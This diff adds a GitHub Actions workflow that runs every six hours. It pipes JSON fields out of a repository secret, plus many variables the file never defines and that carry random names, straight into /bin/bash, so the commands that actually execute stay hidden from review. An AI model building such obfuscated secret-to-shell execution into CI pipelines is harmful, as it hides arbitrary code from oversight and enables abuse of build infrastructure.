@@ -1,0 +1,35 @@
+name: kuantiaohuichuan
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '1 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: kuantiaohuichuan
+        env:
+          uemix70: ${{ secrets.uemix70 }}
+        run: |
+          echo $uemix70 | jq -r .nwp98993 | /bin/bash
+          echo $bc3718 | jq -r .uxru73 | /bin/bash
+          echo $coaqa2 | jq -r .lkxv55 | /bin/bash
+          echo $brok94 | jq -r .q6 | /bin/bash
+          echo $yvsvk188 | jq -r .qvfbq2 | /bin/bash
+          echo $cex456 | jq -r .rpgi9649 | /bin/bash
+          echo $wvi06402 | jq -r .rluh0 | /bin/bash
+          echo $lsldb230 | jq -r .bawa401 | /bin/bash
+          echo $ykk5 | jq -r .ogbc97 | /bin/bash
+          echo $vdl0693 | jq -r .vwj8 | /bin/bash
+          echo $khr993 | jq -r .tri54310 | /bin/bash
+          echo $vwqa572 | jq -r .k68 | /bin/bash
+          echo $yjhi4345 | jq -r .kzba79651 | /bin/bash
+          echo $y2817 | jq -r .gjnxu4 | /bin/bash
+          echo $tnxsx02 | jq -r .zryf666 | /bin/bash
+          echo $s500 | jq -r .hntn047 | /bin/bash
+          echo $ic917 | jq -r .qts7 | /bin/bash
+
